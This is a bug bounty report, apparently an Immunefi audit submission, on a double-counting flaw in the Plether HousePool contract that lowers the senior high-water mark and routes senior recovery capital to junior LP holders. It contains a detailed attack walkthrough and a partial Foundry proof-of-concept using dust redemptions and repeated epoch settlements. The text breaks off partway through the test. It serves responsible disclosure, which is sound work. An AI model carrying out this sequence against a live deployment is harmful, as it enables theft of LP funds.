# \#99086 [SC-High] # Violation of Idempotence in `HousePool._reconcile` Double-Counts `pendingRecapitalizationAssets`, Prematurely Clears Recapitalization Accounting, Slashes `seniorHighWaterMark` and Diverts Senior Recovery Capital to Junior LP

**Submitted on Nov 11th 2026 at 19:51:22 UTC by @dikanevn for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99086
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## 1. Summary

- **Protocol:** Plether
- **Repository / Commit:** `https://github.com/immunefi-team/audit-comp-plether` (`a82d4fefb02768e5b3bddcc97dee371eee24fea8`)
- **Target Assets:** `packages/perps/src/HousePool.sol`, `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol`, `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol`
- **Severity:** `Critical`
- **Impact Category:** `Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield` (classified as **Critical** under the Plether Immunefi competition rules; direct violation of the `High-water-mark protection` invariant defined in `SECURITY.md:394`: premature erasure of the accounting balance `pendingRecapitalizationAssets` and downward ratcheting of `seniorHighWaterMark`, creating conditions for the permanent diversion and extraction of Senior LP recovery funds by Junior LP share holders)
- **Defect Type (CWE):** CWE-840 (Business Logic Errors), CWE-682 (Incorrect Calculation)
- **Vulnerable Code Locations:**
  - `packages/perps/src/HousePool.sol:1555-1599` (`_reconcile`), `:1638-1675` (`_previewPendingAccountingState`), `:1759-1776` (`_applyPendingClaimantBucketsLive`), `:1829-1834` (`_settleablePendingClaimantBuckets`)
  - `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol:47-106` (`planReconcile`, lines `68-71`)
  - `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol:111-137` (`applyClaimantRecapitalizationIntent`, lines `118-122`)

### 1.1. Core Vulnerability

Following an owner call to `CfdEngine.recapitalizePool(amountAssets)`, the full recapitalization amount is credited to `HousePool.pendingRecapitalizationAssets`. If at the time of `HousePool._reconcile` the distributable LP pool value (`reconcileSnapshot.distributable`) is less than `pendingRecapitalizationAssets` (for example, due to unsettled trader profits `traderClaimBalanceAssets` or unrealized mark loss on open positions `terminalLpPriceDeltaAssets < 0`), the first `_reconcile` pass allocates only `distributable` to `seniorPrincipal`, initializes `seniorHighWaterMark` to the target `recapitalizationTargetAssets`, and retains the uncredited remainder in `pendingRecapitalizationAssets`.

The flaw lies in a fundamental **violation of idempotence in `HousePool._reconcile`**: for any constant external pool state (identical `distributable`, no new cash inflows, and no new trading losses), subsequent reconcile passes must be a strict `no-op` with respect to `pendingRecapitalizationAssets`, `seniorHighWaterMark`, and tranche capital balances. Instead, on the second and all subsequent permissionless invocations of `_reconcile` (e.g., triggered via `OrderRouter.settleLpEpoch` / `HousePool.settleLpEpoch`) at the same `distributable`:

1. `_settleablePendingClaimantBuckets` (`HousePool.sol:1829-1834`) repeatedly caps `pendingRecapitalizationAssets` against the full `reconcileSnapshot.distributable`, **without subtracting already distributed capital `seniorPrincipal + juniorPrincipal + unassignedAssets`**.
2. `HousePoolReconcilePlanLib.planReconcile` (`HousePoolReconcilePlanLib.sol:68-71`) subtracts `pendingBucketAssets` from `snapshot.distributable` a second time, despite the previously settled portion of recapitalization already residing inside `seniorPrincipal`. Consequently, `planReconcile` registers a fictitious loss and zeroes out `seniorPrincipal` via `absorbLoss`.
3. Immediately thereafter, `_applyPendingClaimantBucketsLive` -> `applyClaimantRecapitalizationIntent` (`HousePoolPendingPreviewLib.sol:118-122`), observing `seniorPrincipal == 0 && juniorPrincipal == 0`, re-credits the same funds to `seniorPrincipal`, **overwrites `seniorHighWaterMark` downward** to the current remaining balance of `pendingRecapitalizationAssets`, and irrevocably burns another portion of `pendingRecapitalizationAssets` accounting balance to zero (tokens remain in the pool, but the dedicated accounting entitlement protecting Senior LP recovery is permanently erased).

Over 2 to 3 permissionless `settleLpEpoch` calls, the `pendingRecapitalizationAssets` counter is burned to zero without actual capital accretion to Senior LP, and `seniorHighWaterMark` is ratcheted down below the recapitalization target. When the temporary unrealized mark deficit (`terminalLpPriceDeltaAssets < 0`) reverts, the recovered liquidity—which was intended to restore Senior LP to their original high-water mark (with any excess isolated in `unassignedAssets`)—is instead routed into `juniorPrincipal`. From there, a Junior LP holder can extract it via standard `claimRedeem`.

In our reproducible Foundry PoC with `recapitalizePool(100_000 USDG)`, an attacker holding a pre-loss Junior deposit of `49,000.00 USDG` extracts a gross redemption payout of **`61,939.89 USDG`** (`61,939.886634 USDG`) instead of **`0 USDG`** in the control run (a net gain of **`~12,939.89 USDG`** over their deposit before gas/oracle costs), while Senior LP permanently loses **`36,601.40 USDG`** of protected recovery compared to the control run. The 36.6% loss demonstrated in the PoC serves as an immediate baseline: under tighter temporary liquidity constraints (e.g., `distributable = 10,000 USDG` against `100,000 USDG` recapitalization), a series of epochs slashes `seniorHighWaterMark` all the way down to `distributable`, creating a Senior recovery shortfall of up to **90%+** of the recapitalization capital.

---

## 2. Root Cause Analysis

### 2.1. Mechanics of `HousePool._reconcile` and `planReconcile` Handling `pendingRecapitalizationAssets`

When the owner invokes `CfdEngine.recapitalizePool(amountAssets)` (`CfdEngine.sol:632-653`), the contract transfers `amountAssets` to `HousePool` and calls `pool.recordClaimantInflow(amountAssets, Recapitalization, CashArrived)` (`HousePool.sol:624-651`). This increments both `accountedAssets` and `pendingRecapitalizationAssets` by `amountAssets`.

During the subsequent execution of `HousePool._reconcile` (`HousePool.sol:1555-1599`):

1. The accounting snapshot is computed (`HousePoolAccountingLib.buildReconcileSnapshot`, lines `60-78`):
   `distributable = max(0, physicalAssets + terminalLpPriceDeltaAssets - traderClaimBalanceAssets)`
2. The settleable portion of pending claimant buckets is calculated (`HousePool.sol:1565-1566`, `1829-1834`):
   ```solidity
   function _settleablePendingClaimantBuckets(
       HousePoolAccountingLib.ReconcileSnapshot memory reconcileSnapshot,
       HousePoolPendingPreviewLib.ClaimantPendingBuckets memory claimantBuckets
   ) internal pure returns (HousePoolPendingPreviewLib.ClaimantPendingBuckets memory settleableClaimantBuckets) {
       return HousePoolPendingPreviewLib.capClaimantBuckets(claimantBuckets, reconcileSnapshot.distributable);
   }
   ```
   Here, `capClaimantBuckets` caps the sum `pendingRecapitalizationAssets + pendingTradingRevenueAssets` against the entire `reconcileSnapshot.distributable`—without accounting for the portion of `distributable` already allocated to `seniorPrincipal`, `juniorPrincipal`, and `unassignedAssets`.
3. Inside `HousePoolReconcilePlanLib.planReconcile` (`HousePoolReconcilePlanLib.sol:68-105`), `pendingBucketAssets` is deducted from `snapshot.distributable` prior to comparing against `seniorPrincipal + juniorPrincipal`:
   ```solidity
   if (pendingBucketAssets > 0) {
       snapshot.distributable =
           snapshot.distributable > pendingBucketAssets ? snapshot.distributable - pendingBucketAssets : 0;
   }
   ...
   HousePoolWaterfallAccountingLib.ReconcilePlan memory waterfallPlan =
       HousePoolWaterfallAccountingLib.planReconcile(
           plan.state.waterfall.seniorPrincipal, plan.state.waterfall.juniorPrincipal, distributableToClaims
       );
   ...
   if (plan.deltaAssets > 0) {
       plan.state.waterfall = HousePoolWaterfallAccountingLib.absorbLoss(plan.state.waterfall, plan.deltaAssets);
       return plan;
   }
   ```
4. The planned `waterfall` is written to storage (`HousePool.sol:1584`), followed by `_applyPendingClaimantBucketsLive` (`HousePool.sol:1598`, `1759-1776`), which reads the **newly reduced** `waterfall` from storage and executes `applyClaimantRecapitalizationIntent` (`HousePoolPendingPreviewLib.sol:111-137`):
   ```solidity
   function applyClaimantRecapitalizationIntent(
       PendingAccountingState memory state,
       uint256 amount,
       uint256 recapitalizationTargetAssets
   ) internal pure {
       uint256 remaining = amount;
       if (state.seniorSupply > 0) {
           if (state.waterfall.seniorPrincipal == 0 && state.waterfall.juniorPrincipal == 0) {
               state.waterfall.seniorPrincipal += remaining;
               state.waterfall.seniorHighWaterMark =
                   recapitalizationTargetAssets > remaining ? recapitalizationTargetAssets : remaining;
               remaining = 0;
           } else {
               ...
           }
       }
   ```
   Finally, `pendingRecapitalizationAssets` is decreased by `settleableClaimantBuckets.recapitalizationAssets` (`HousePool.sol:1772`, `1787-1792`).

### 2.2. Step-by-Step Mechanism of Double-Deduction and HWM Slashing

Consider the concrete state demonstrated in our PoC: the pool holds `26,601.40 USDG` in cash, the owner injects `recapitalizePool(100_000 USDG)` (total cash `126,601.40 USDG`), and open positions carry an unrealized profit of `90,000 USDG` (`terminalLpPriceDeltaAssets = -90,000 USDG`), yielding `distributable = 36,601.40 USDG < 100,000 USDG`:

- **Pass #1 (`settleLpEpoch`):**
  - `settleable = min(100_000, 36_601.40) = 36_601.40 USDG`.
  - `planReconcile` subtracts `36_601.40` from `36_601.40`, yielding `0`, and zeroes out previous `juniorPrincipal` and `seniorPrincipal` via `absorbLoss`.
  - `applyClaimantRecapitalizationIntent` detects `seniorPrincipal == 0 && juniorPrincipal == 0`: writes `seniorPrincipal = 36_601.40 USDG`, sets `seniorHighWaterMark = 100_000 USDG`, and leaves `63_398.60 USDG` in `pendingRecapitalizationAssets`.
- **Pass #2 (Repeated permissionless `settleLpEpoch` at the same `distributable = 36,601.40 USDG`):**
  - `_settleablePendingClaimantBuckets` again observes `distributable = 36_601.40 USDG` and assumes that from the residual `63_398.60 USDG`, an additional `36_601.40 USDG` can be settled—**ignoring that these `36_601.40 USDG` are already allocated to `seniorPrincipal`**.
  - `planReconcile` subtracts `36_601.40` from `36_601.40` -> `0` against `seniorPrincipal = 36_601.40 USDG`, registering a **fictitious loss of `36_601.40 USDG`** and zeroing out `seniorPrincipal` to `0`.
  - `applyClaimantRecapitalizationIntent` enters the `seniorPrincipal == 0 && juniorPrincipal == 0` branch again, restores `seniorPrincipal = 36_601.40 USDG`, **overwrites `seniorHighWaterMark` downward from `100_000 USDG` to `63_398.60 USDG`** (the current pass's `recapitalizationTargetAssets`!), and burns another `36_601.40 USDG` from `pendingRecapitalizationAssets`, leaving `26_797.20 USDG`.
- **Pass #3 (Repeated `settleLpEpoch` at `distributable = 36,601.40 USDG`):**
  - `settleable = min(26_797.20, 36_601.40) = 26_797.20 USDG`.
  - `planReconcile` subtracts `26_797.20` from `36_601.40` -> `9_804.20 USDG` against `seniorPrincipal = 36_601.40 USDG`, absorbing a fictitious loss of `26_797.20 USDG` (`seniorPrincipal` drops to `9_804.20 USDG`).
  - `applyClaimantRecapitalizationIntent` restores `26_797.20 USDG` back to `seniorPrincipal = 36_601.40 USDG` and completely burns `pendingRecapitalizationAssets` down to `0`.
  - *(Note: as long as the residual `pendingRecapitalizationAssets >= distributable` prior to the final pass, e.g., `100_000 / 20_000` over a series of epochs, `seniorPrincipal` is fictitiously zeroed on each intermediate pass, sequentially ratcheting `seniorHighWaterMark` down to `20_000 USDG`.)*

### 2.3. How an Attacker Triggers `_reconcile` Permissionlessly and Bypasses `HousePool__NoLpEpochProgress`

1. **`degradedMode == false` is cleanly restored by governance:** `CfdEngine.clearDegradedMode()` (`CfdEngine.sol:658-667`) strictly verifies `_availableCashForFreshPoolPayouts() >= _maxLiability()` (`126,601.40 >= 100,000`), and does not require `distributable >= pendingRecapitalizationAssets`.
2. **Bypassing `HousePool__NoLpEpochProgress` (`HousePool.sol:1183-1185`):** When `freeAssets == 0` (all unassigned liquidity is absorbed by the pending recapitalization remainder), calling `settleLpEpoch` without queued redemptions reverts with `HousePool__NoLpEpochProgress`. However, in `TrancheVault._requireMinimumRedeemSize` (`TrancheVault.sol:1611-1618`), a full share redemption (`shares == maxShares`) intentionally bypasses the minimum order threshold (`MIN_TRANCHE_DEPOSIT_ASSETS = 1e6`). Consequently, when `juniorPrincipal == 0`, any address holding a dust balance of Junior shares (e.g., `1 wei` distributed to a helper address) can submit `requestRedeem(1, ...)`. Once the epoch elapses (`LP_EPOCH_DURATION = 1 hours`), calling `OrderRouter.settleLpEpoch` (permissionless for any caller, `router/OrderLiquidationBatchLogic.sol:549-581`) enters `_fundRedemptionPhase` (`HousePool.sol:957-987`), observes `fullHeadAssets == 0`, invokes `refundRedeemEpochRemainder`, and increments `phase.processedEpochs += 1`, cleanly completing `settleLpEpoch` after `_reconcile` has executed.
3. **Architectural Side-Notes on Related Mechanics:**
   Two related mechanics in the codebase mirror this logic:
   - In `HousePoolReconcilePlanLib.planReconcile` (lines `68-71`), if `distributable < pendingTradingRevenueAssets` when `seniorPrincipal + juniorPrincipal == 0`, an identical double deduction impacts `pendingTradingRevenueAssets`, potentially affecting the deposit gate in `canAcceptTrancheDeposits` (`HousePool.sol:480-503`);
   - In `HousePoolPendingPreviewLib.applyClaimantRecapitalizationIntent` (lines `118-122`), on an empty pool, the logic unconditionally overwrites the HWM with the new target without comparing against a potentially higher pre-existing HWM.

### 2.4. Why Existing Tests Missed the Flaw and Absence from Known Issues

In existing repository tests `test_PendingRecapitalization_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual` and `test_PendingRevenue_CapsAgainstTraderClaimLiabilitiesAndCarriesResidual` (`packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol:177-258`), the developers tested the progression from the first `_reconcile` to the second by **manually zeroing out `totalTraderClaimBalanceAssets` (`_setTotalTraderClaim(0)`) before the second `pool.reconcile()`**. The scenario where `_reconcile` is invoked repeatedly prior to releasing `distributable` (while `traderClaimBalanceAssets` or `terminalLpPriceDeltaAssets < 0` remain constant) was never evaluated in any test across the repository.

Neither `packages/perps/SECURITY.md` (including sections `Owner-funded recapitalization` on lines `155-163`, invariant `High-water-mark protection` on line `394`, and known rounding limits on lines `1401-1433`) nor prior audit reports in `audits/` mention or mitigate this double-accounting defect on commit `a82d4fef`.

---

## 3. Impact Analysis

### 3.1. Redistribution of Senior LP Recovery Capital to Junior LP

Under the invariant `High-water-mark protection` (`SECURITY.md:394`), all prior Senior tranche impairments and recapitalization targets must be restored in full before Junior can extract surplus. Furthermore, by protocol specification (`SECURITY.md:155-163`), `CfdEngine.recapitalizePool` is designed as a non-dilutive restoration of Senior LP claims (surplus beyond HWM must isolate into `unassignedAssets`, not flow to Junior LP).

In the attack scenario:
- **Baseline Behavior (Control scenario without repeated `_reconcile`):** After price reverts to `1.00` and the trader position is closed, `seniorPrincipal` is restored to **`100,000.00 USDG`** (`seniorHighWaterMark = 100,000.00 USDG`), the excess `26,601.40 USDG` is isolated into `unassignedAssets`, `juniorPrincipal == 0`, and Junior LP receives **`0 USDG`**.
- **Under Repeated Permissionless `settleLpEpoch` Prior to Price Reversion:** `seniorHighWaterMark` is ratcheted down from `100,000.00 USDG` to **`63,398.60 USDG`**, and `pendingRecapitalizationAssets` is completely wiped to **`0`**. Upon price recovery, Senior LP receives only `63,398.60 USDG`—representing a shortfall of **`36,601.40 USDG`** in Senior recovery compared to the control run. All unallocated liquidity above `63,398.60 USDG` is directed into `juniorPrincipal`: `JUNIOR_ATTACKER` (who deposited **`49,000.00 USDG`**) extracts **`61,939.886634 USDG`** via standard `claimRedeem` instead of **`0 USDG`** in the control run (the remaining `1,262.913366 USDG` backs the permanent 1,000 USDG Junior seed). The net profit over the initial deposit is **`12,939.886634 USDG`** (`~12,939.89 USDG`, before gas and Pyth fees).
- **Scalability of HWM Slashing:** The `distributable = 36,601.40 USDG` figure in the PoC serves as a direct demonstration. If available `distributable` is temporarily constrained to a smaller fraction (e.g., `distributable = 10,000 USDG` during a `100,000 USDG` recapitalization), consecutive epochs ratchet `seniorHighWaterMark` down to `distributable`, exposing Senior LP to recovery losses of up to **90%+** of the recapitalized capital.

### 3.2. Attack Feasibility and Preconditions

- **No Additional Capital Required for Execution:** Calling `settleLpEpoch` requires no capital injection; the function is permissionless, requiring only standard Pyth update fees and an executable redemption request (bypassed via 1-wei dust shares).
- **Time Window:** The PoC demonstrates 3 epochs (`LP_EPOCH_DURATION = 1 hours`), but the initial HWM slashing from `100,000.00 USDG` to `63,398.60 USDG` occurs immediately on the very first repeat call (1 hour after the first epoch).
- **Triggers for Constrained `distributable`:** By formula `distributable = max(0, physicalAssets + terminalLpPriceDeltaAssets - traderClaimBalanceAssets)`, pool liquidity constraints arise naturally not only from unrealized profits of active trades (`terminalLpPriceDeltaAssets < 0`), but also from `traderClaimBalanceAssets` (settled trader profits awaiting withdrawal).
- **Governance Actions:** Calls to `recapitalizePool` and `clearDegradedMode` are performed strictly through documented administrative interfaces.
- **Junior LP Share Mechanics:**
  1. *Pre-existing Junior Deposits (as proven in the main PoC):* If a participant holds Junior LP shares prior to the trading loss, subsequent recapitalization and repeated `settleLpEpoch` calls redirect recovery liquidity directly into Junior LP equity.
  2. *New Capital Entry Following Degraded Mode Clearance:* After `engine.clearDegradedMode()`, `degradedMode` is set to `false`. The deposit gate `HousePool._canAcceptTrancheDeposits(false)` checks `ctx.pendingState.waterfall.juniorPrincipal == 0 && ctx.pendingState.juniorSupply != 0`. Therefore, the window to queue fresh Junior LP deposits is open whenever mark prices project a positive Junior equity (e.g., immediately after recapitalization at price `1.95`, where the preview projects `juniorPrincipal ≈ 21,601 USDG`), and closes only when subsequent price swings drive projected Junior principal to zero.
- **Zero-Capital Denial of Recovery Griefing:** Even without Junior LP shares, any external caller can trigger `settleLpEpoch` using dust redemptions, permanently destroying `pendingRecapitalizationAssets` and lowering `seniorHighWaterMark`, permanently depriving Senior LPs of their recovery entitlement.

### 3.3. Immunefi Severity Classification Justification

- **Alignment with `Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield` (Critical):**
  Under Immunefi's rules, direct theft of user funds is classified as **Critical**. The PoC proves a direct extraction of tokens (`61,939.886634 USDG`, net gain `~12,939.89 USDG`) via `JuniorVault.claimRedeem` to an external address, while Senior LP claim entitlements are reduced by `36,601.40 USDG` compared to the control run.
- **Status of Funds and Invariant Protections:**
  1. *Senior LP User Principal:* Users deposited their own principal (`100,000.00 USDG`). Although trading losses reduced current cash, their rights are strictly protected by the `High-water-mark protection` invariant (`SECURITY.md:394`: *"Senior impairment must be restored before junior extracts surplus"*).
  2. *Non-Dilutive Recapitalization:* Per specification (`SECURITY.md:155-163`), `recapitalizePool` injects liquidity specifically to fulfill Senior LP entitlements without issuing new shares and without allowing owner clawbacks.
  3. *Diversion of Earmarked Assets:* Injected assets are legally and architecturally committed by contract logic to back Senior LP claims. Prematurely clearing the recapitalization counter and slashing HWM exposes these recovery assets to extraction by Junior LP shares.
- **Nature of Affected Capital (Principal vs. Yield):**
  1. Plether contracts (`HousePoolWaterfallAccountingLib.sol`) explicitly distinguish between principal (`principal`) and accrued coupon (`yield`).
  2. Recapitalization specifically restores principal (`seniorPrincipal` up to `recapitalizationTargetAssets = 100,000.00 USDG`). The `36,601.40 USDG` difference directly impairs the underlying deposit principal.
- **Legitimacy and Permissionless Execution:** All owner calls follow standard administrative workflows, while epoch settlements are permissionless and execute without elevated privileges under Immunefi's Trusted Roles policy.

---


## Proof of Concept

## 4. Proof of Concept

The Foundry test is implemented on top of the repository's native `AtomicLpEpochSettlementTestFixture` without modifying in-scope contracts and without storage manipulation cheatcodes (`stdstore`). It relies entirely on production protocol calls (`requestDeposit`, `claimDeposit`, `transfer`, `requestRedeem`, `claimRedeem`, `_open`/`_close`, `recapitalizePool`, `clearDegradedMode`, `OrderRouter.settleLpEpoch`) and the official `MockPyth`:

1. `test_PoC_RecapitalizationDoubleCount_SlashesSeniorHwmAndTransfersValueToJunior` — proves complete erasure of `pendingRecapitalizationAssets` (`100,000 USDG -> 63,398.60 -> 26,797.20 -> 0`), slashing of `seniorHighWaterMark` (`100,000 USDG -> 63,398.60 USDG`), Senior LP recovery loss of `36,601.40 USDG`, and gross withdrawal of `61,939.886634 USDG` by `JUNIOR_ATTACKER` (`~12,939.89 USDG` net profit over deposit, compared to `0 USDG` in the control run).
2. `test_Control_WithoutSecondReconcileBeforeRecovery_SeniorRecoversFullTarget` — control run using identical parameters and governance actions, but without repeated `settleLpEpoch` before price recovery: proves that under proper single-reconcile execution, Senior LP recovers the full `100,000.00 USDG`, and `JUNIOR_ATTACKER` receives `0` (`claimableShares == 0`, `juniorPrincipal == 0`).

### 4.1. Step-by-Step Attack Walkthrough

1. **Initial Pool State:** `SENIOR_LP` deposits `99,000 USDG` (+ `1,000 USDG` Senior seed -> `seniorPrincipal = 100,000 USDG`, `seniorHighWaterMark = 100,000 USDG`). `JUNIOR_ATTACKER` deposits `49,000 USDG` (+ `1,000 USDG` Junior seed -> `juniorPrincipal = 50,000 USDG`). After `DEPOSIT_COOLDOWN` (`1 hours`), the attacker transfers `1 wei` of Junior shares to three helper addresses `REDEEM_HELPER_1..3`.
2. **Pool Loss and Legitimate Recapitalization:** Two traders open opposing positions at price `1.00`: `TRADER_LONG` (`100,000` LONG) and `TRADER_SHORT` (`130,000` SHORT). Price rises to `1.95`, `TRADER_SHORT` closes in profit and withdraws liquidity (pool cash falls to `26,601.40 USDG`, activating `degradedMode`). The owner legitimately invokes `engine.recapitalizePool(100_000 USDG)` (cash rises to `126,601.40 USDG`, `pendingRecapitalizationAssets = 100,000 USDG`) and `engine.clearDegradedMode()` (`126,601.40 >= 100,000`).
3. **Temporary Unrealized Trader Profit (`distributable < pendingRecapitalizationAssets`):** Price drops to `0.10`, generating `~90,000 USDG` of unrealized profit for `TRADER_LONG` (`distributable = 36,601.40 USDG < 100,000 USDG`). *(Note on repository fixture convention: per `test_LossWaterfall_JuniorAbsorbs`: "Price drops to $0.50 -> LONG profits $100k", basket price drops yield profit for LONG positions; the PoC follows this standard test convention).*
4. **Pass #1 (`settleLpEpoch`):** `REDEEM_HELPER_1` queues `requestRedeem(1, ...)`, and at epoch maturity the attacker calls `router.settleLpEpoch`. `juniorPrincipal` is zeroed, `seniorPrincipal = 36,601.40 USDG`, `seniorHighWaterMark = 100,000.00 USDG`, and `pendingRecapitalizationAssets = 63,398.60 USDG`.
5. **Passes #2 and #3 (`settleLpEpoch` at constant price `0.10`):** The attacker repeats the sequence with `REDEEM_HELPER_2` and `REDEEM_HELPER_3` (each full 1-wei redemption bypasses the minimum threshold and advances `processedEpochs` via `refundRedeemEpochRemainder`). On pass #2, the double-deduction of `36,601.40 USDG` in `planReconcile` wipes `seniorPrincipal` to zero, triggering `applyClaimantRecapitalizationIntent` to slash `seniorHighWaterMark` to `63,398.60 USDG` and burn `36,601.40 USDG` of pending recap balance (`pendingRecap = 26,797.20 USDG`). On pass #3, the remaining `26,797.20 USDG` is burned to zero.
6. **Price Recovery and Extraction from Junior:** Price returns to `1.00`, and `TRADER_LONG` closes at breakeven (`distributable` returns to `~126,601 USDG`). `JUNIOR_ATTACKER` requests redemption of their remaining shares and calls `HousePool.settleLpEpoch`. Because `seniorHighWaterMark` was slashed to `63,398.60 USDG`, all surplus above `63,398.60 USDG` leaks into `juniorPrincipal`. Via `claimRedeem`, `JUNIOR_ATTACKER` withdraws `61,939.886634 USDG` (`~12,939.89 USDG` net profit over deposit, compared to `0 USDG` in control), while Senior LP permanently loses `36,601.40 USDG` of recovery.

### 4.2. Instructions to Execute the PoC

#### 4.2.1. Clone Repository and Checkout Scope Commit

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
```

#### 4.2.2. Create PoC Test File

```bash
cat << 'EOF' > packages/perps/test/perps/spec/lp/HousePoolRecapDoubleCountPoC.t.sol
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {AtomicLpEpochSettlementTestFixture} from "../../shared/AtomicLpEpochSettlementFixture.sol";
import {console2} from "forge-std/console2.sol";

contract HousePoolRecapDoubleCountPoCTest is AtomicLpEpochSettlementTestFixture {

    address internal constant SENIOR_LP = address(0x5E1102);
    address internal constant JUNIOR_ATTACKER = address(0xBAAD01);
    address internal constant REDEEM_HELPER_1 = address(0xBAAD02);
    address internal constant REDEEM_HELPER_2 = address(0xBAAD03);
    address internal constant REDEEM_HELPER_3 = address(0xBAAD04);
    address internal constant TRADER_LONG = address(0x7101);
    address internal constant TRADER_SHORT = address(0x7102);

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1_000e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1_000e6;
    }

    function _seedSeniorLp(
        address lp,
        uint256 assets
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(seniorVault), assets);
        uint256 requestId = seniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();

        _warpToEpoch(requestId);
        pool.settleLpEpoch(0, 0);

        uint256 claimableAssets = seniorVault.claimableDepositRequest(requestId, lp);
        assertGt(claimableAssets, 0, "senior deposit should be claimable");
        vm.prank(lp);
        shares = seniorVault.claimDeposit(requestId, claimableAssets, lp, lp);
    }

    function _makePoolAssetsWithTwoTraders() internal {
        // 1. Seeded pool = 1,000 Senior + 1,000 Junior.
        //    SENIOR_LP deposits 99,000 USDG -> seniorPrincipal = 100,000, seniorHWM = 100,000.
        //    JUNIOR_ATTACKER deposits 49,000 USDG -> juniorPrincipal = 50,000.
        _seedSeniorLp(SENIOR_LP, 99_000e6);
        uint256 attackerShares = _seedJuniorLp(JUNIOR_ATTACKER, 49_000e6);
        assertGe(pool.seniorPrincipal(), 100_000e6);
        assertGe(pool.seniorHighWaterMark(), 100_000e6);
        assertLe(pool.juniorPrincipal(), 50_000e6);

        // Wait past DEPOSIT_COOLDOWN (1 hour) so JUNIOR_ATTACKER can split 3 wei of shares
        // to three helper addresses to queue 1-wei full redemptions across epochs.
        vm.warp(vm.getBlockTimestamp() + juniorVault.DEPOSIT_COOLDOWN() + 1);
        vm.startPrank(JUNIOR_ATTACKER);
        juniorVault.transfer(REDEEM_HELPER_1, 1);
        juniorVault.transfer(REDEEM_HELPER_2, 1);
        juniorVault.transfer(REDEEM_HELPER_3, 1);
        vm.stopPrank();
        assertGt(attackerShares, 3);
    }

    function test_PoC_RecapitalizationDoubleCount_SlashesSeniorHwmAndTransfersValueToJunior() public {
        _makePoolAssetsWithTwoTraders();

        // 2. Two traders open opposing positions at price 1.00:
        //    - TRADER_LONG opens LONG 100,000 (maxProfit = 100,000 <= 150,000 pool)
        //    - TRADER_SHORT opens SHORT 130,000 (maxProfit = 130,000 <= 150,000 pool)
        _fundTrader(TRADER_LONG, 130_000e6);
        _fundTrader(TRADER_SHORT, 150_000e6);
        _open(TRADER_LONG, CfdTypes.Side.LONG, 100_000e18, 120_000e6, 1e8);
        _open(TRADER_SHORT, CfdTypes.Side.SHORT, 130_000e18, 140_000e6, 1e8);

        // 3. Price moves to 1.95: TRADER_SHORT closes and takes ~123,500 USDG from pool.
        //    Pool cash drops to ~26,500 USDG (< TRADER_LONG maxLiability 100,000), entering degradedMode.
        vm.warp(vm.getBlockTimestamp() + 10);
        _close(TRADER_SHORT, CfdTypes.Side.SHORT, 130_000e18, 1.95e8);
        assertTrue(engine.degradedMode(), "pool entered degradedMode after short payout");
        uint256 cashBeforeRecap = pool.totalAssets();
        console2.log("Pool cash after short payout:", cashBeforeRecap);

        // 4. Owner legitimately recapitalizes the pool with 100,000 USDG and clears degradedMode.
        uint256 recapAmount = 100_000e6;
        settlementToken.mint(address(this), recapAmount);
        settlementToken.approve(address(engine), recapAmount);
        engine.recapitalizePool(recapAmount);
        engine.clearDegradedMode();
        assertFalse(engine.degradedMode(), "degradedMode cleared cleanly");
        assertEq(pool.pendingRecapitalizationAssets(), recapAmount);

        // 5. Price moves to 0.10: TRADER_LONG now has ~90,000 unrealized profit (terminalLpPriceDelta < 0),
        //    so distributable = ~126,500 - 90,000 = ~36,500 < recapAmount (100,000).
        //    (Note on fixture convention: following repo's test_LossWaterfall_JuniorAbsorbs where price drops -> LONG profits).
        vm.warp(vm.getBlockTimestamp() + 10);
        _setBasket(0.10e8, 0, vm.getBlockTimestamp());
        router.updateMarkPrice(_emptyUpdateData());

        // Queue helper 1 full redemption (1 wei of junior shares -> fullHeadAssets == 0 once juniorPrincipal == 0).
        vm.prank(REDEEM_HELPER_1);
        uint256 redeemEpoch1 = juniorVault.requestRedeem(1, REDEEM_HELPER_1, REDEEM_HELPER_1);
        _warpToEpoch(redeemEpoch1);
        _setBasket(0.10e8, 0, vm.getBlockTimestamp());

        // --- First permissionless settleLpEpoch ---
        address attackerCaller = address(0xC011);
        vm.prank(attackerCaller);
        router.settleLpEpoch(_emptyUpdateData());

        uint256 seniorAfter1 = pool.seniorPrincipal();
        uint256 hwmAfter1 = pool.seniorHighWaterMark();
        uint256 pendingAfter1 = pool.pendingRecapitalizationAssets();
        console2.log("After settle #1 -> seniorPrincipal:", seniorAfter1);
        console2.log("After settle #1 -> seniorHighWaterMark:", hwmAfter1);
        console2.log("After settle #1 -> pendingRecap:", pendingAfter1);

        assertEq(pool.juniorPrincipal(), 0, "junior wiped out after settle #1");
        assertEq(hwmAfter1, recapAmount, "after settle #1 HWM is set to recapAmount");
        assertGt(pendingAfter1, 0, "residual pendingRecap remains");

        // --- Second permissionless settleLpEpoch at the SAME price (no new cash/loss) ---
        vm.prank(REDEEM_HELPER_2);
        uint256 redeemEpoch2 = juniorVault.requestRedeem(1, REDEEM_HELPER_2, REDEEM_HELPER_2);
        _warpToEpoch(redeemEpoch2);
        _setBasket(0.10e8, 0, vm.getBlockTimestamp());

        vm.prank(attackerCaller);
        router.settleLpEpoch(_emptyUpdateData());

        uint256 seniorAfter2 = pool.seniorPrincipal();
        uint256 hwmAfter2 = pool.seniorHighWaterMark();
